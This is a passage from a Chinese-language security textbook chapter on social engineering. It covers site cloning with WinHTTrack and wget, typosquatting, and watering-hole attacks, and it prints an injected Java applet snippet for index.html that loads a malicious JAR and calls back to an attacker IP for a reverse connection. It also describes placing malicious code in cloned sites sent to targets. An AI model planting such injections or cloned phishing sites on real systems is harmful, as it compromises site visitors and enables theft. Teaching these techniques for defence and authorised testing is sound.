

即使它们出于某种原因发生了变化，你也可以将其指向它们。实际上，这会让你的克隆网站更具可信度。如果有人留意，他们会看到请求是发往合法网站，而不是你的恶意网站。唯一来自你恶意网站的文件是控制页面渲染的 HTML。这并不是说你不能抓取文件并在本地托管。使用 WinHTTrack 之类的工具，这是一个可配置选项，如图 10.6 所示。

### 图 10.6 WinHTTrack 选项

![](img/421171b17a0c0dfae0aacde15d9831c1_404_0.png)

当然，这些选项是可选的。默认情况下，WinHTTrack 不会抓取媒体文件，只会抓取站点的 HTML。不过，它会克隆整个站点，这意味着它会遍历链接。WinHTTrack 使用项目来克隆站点，因此抓取一个网站是一个多步骤过程。在图 10.7 中，你可以看到输入 URL 的步骤。如果你想下载多个站点，也可以输入多个 URL。你需要将操作更改为 Download All Sites In Pages。你也可以使用 WinHTTrack 来测试网站，而不是下载它们，这意味着你可以检查一份书签列表，看它们是否仍然有效。

不过，如果你更喜欢命令行工具，有几个可供选择。其中之一是 wget，它是一个用于发送基于 Web 的请求并获取文件的程序。你可以使用 wget 从命令行下载文件。在 Linux 系统上，你可以抓取源代码 tarball、软件包文件或任何不需要渲染的文件。你可以使用 wget 对 Web 服务器执行递归 GET 请求，这正是镜像站点所需的。这意味着 wget 会拉取站点顶部的 HTML 页面并将其保存。然后，它会查找页面中的所有锚标签，并依次跟随每个链接来获取那些页面或文件。在下面的代码清单中，你可以看到使用 -m 选项运行 wget 的示例，这告诉 wget 镜像站点，即抓取整个站点。

### 图 10.7 使用 WinHTTrack 克隆站点

![](img/421171b17a0c0dfae0aacde15d9831c1_405_0.png)

## 使用 wget 镜像网站

```
root@quiche:~# wget -m https://www.wiley.com
--2018-11-21 07:05:43--  https://www.wiley.com/
Resolving www.wiley.com (www.wiley.com)... 143.204.29.19, 143.204.29.108,
143.204.29.24, ...
Connecting to www.wiley.com (www.wiley.com)|143.204.29.19|:443... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: /en-us [following]
--2018-11-21 07:05:43--  https://www.wiley.com/en-us
Reusing existing connection to www.wiley.com:443.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'www.wiley.com/index.html'

www.wiley.com/index    [ <=>                                                                         ] 85.83K  --.-KB/s    in 0.08s  

Last-modified header missing -- time-stamps turned off.
2018-11-21 07:05:44 (1.08 MB/s) - 'www.wiley.com/index.html' saved [87888]

Loading robots.txt; please ignore errors.
--2018-11-21 07:05:44-- https://www.wiley.com/robots.txt
Reusing existing connection to www.wiley.com:443.
HTTP request sent, awaiting response... 200 OK
Length: 817 [text/plain]
Saving to: 'www.wiley.com/robots.txt'

www.wiley.com/robots.txt 100%[===================>] 817 --.-KB/s in 0s
```

如果你想离线访问该站点，可以使用命令行开关将链接设为相对链接。不过，就我们的目的而言，我们希望通过自己的 Web 服务器提供站点访问，因此我们将只是镜像站点，保持一切原样。另一个类似于 wget 的命令行程序是 cURL。不幸的是，尽管 cURL 功能强大，但它没有内置功能来抓取完整网站。不过，你可以编写一个简短的脚本来抓取站点，网上也有这样的脚本可供那些更喜欢使用 cURL 而非 wget 的人使用。

一旦将站点的页面就位，你就需要对源代码进行任何必要的调整。这包括插入你的恶意代码，以便其可以被下载，然后在站点的某个页面中包含对它的引用。一旦你拥有了站点，就可以将页面 URL 发送给目标，可能是通过电子邮件。在社会工程学方面，攻击有时会有多个层级。

## 恶意攻击

恶意网站是指用户可能认为是合法的，但实际上具有恶意目的的网站。这可能是一个看起来与合法网站一模一样的站点，使用前面提到的网站克隆技术，但 URL（即完全限定域名）与通常的 URL 不同。有些主机名经常被拼写错误。攻击者可以将这些常见拼写错误注册为域名本身，然后等待人们前来访问。这种策略称为拼写劫持（typosquatting）。例如，你可以注册 gogle.com 并克隆 google.com 网站，在托管你的 gogle.com 站点的服务器上提供页面。你也可能听到这种策略被称为 URL 劫持（URL hijacking）。

不过，Rogue 不一定意味着你创建了一个假网站。它可能意味着你正在使用合法平台来实施攻击，而该合法平台对此一无所知。水坑攻击是一种社会工程学攻击，利用人们会经常访问某些网站这一事实。在野外，水坑是动物经常光顾，甚至可能逗留的地方。因为动物保证会来这里，因为水对生命至关重要，且并非所有动物都能从食物中获取所需全部水分，所以水坑是等待动物光顾的绝佳地点。这种攻击也是如此。

使用水坑攻击，你可以入侵许多人的常访问网站，并向其中注入受感染的软件。这并非说这种攻击易于实施，但使用它可以快速控制大量系统。与仅入侵单个系统不同，如果你入侵了你所针对的人群经常访问的网站，你可以通过入侵单个系统来访问许多系统。一旦跨越了入侵网站这一难关——例如，如果你入侵了 espn.com，你会有许多男性定期访问——实施攻击就很容易。例如，在下面的代码清单中，你可以看到在 index.html 页面底部添加的几行代码。

### 带有 Applet 引用的攻击 HTML

```
</script>

<applet code="Java.class" width="1" height="1" archive="hkFKIKkhSvSHss.jar"><param name="name"><param name="1" value="http://192.168.86.57:80/krmnAir"><param name="2" value="ZGF0YQ=="><param name="3" value="http://192.168.86.57:80/qpaacKQk"><param name="4" value="http://192.168.86.57:80/FMLhoBQCuNH">
```

不过，这确实需要你有一个可用的 applet，这些 applet 可以现成获取，也可以自行创建。与许多其他事情一样，Metasploit 可用于此类攻击载荷。此 HTML 片段告诉浏览器加载 Java 存档（JAR）hkFKIKkhSvSHss.jar 中的 Java 类。这是一个随机生成的文件名。此攻击中包含一个指向加载到攻击中的 IP 地址的反向连接。

你会看到的基于 Web 的攻击不只有水坑攻击，但它们的优势在于具有针对性。在针对组织工作时，它们可能更有用。如果公司有内网服务器，你可以将攻击加载到内网服务器上，因为这是员工会定期访问的站点类型，你可能会从受攻陷的主机收集大量桌面系统。

## 无线社会工程学

Wi-Fi 网络已无处不在，而且由于许多设备甚至不支持有线连接，人们普遍期望能使用 Wi-Fi 网络。这是你可以利用的另一个方面。在大多数地方，你都可以找到长长的 Wi-Fi 网络列表。就坐在我小型社区的客厅里，就有近二十个可用的 Wi-Fi 网络列表。你可以在图 10.8 中看到该列表。命名这些网络没有限制。没有集中的注册名称的场所。你甚至可以在同一物理空间中拥有重叠的名称。连接的客户端来决定实际连接到哪个网络。

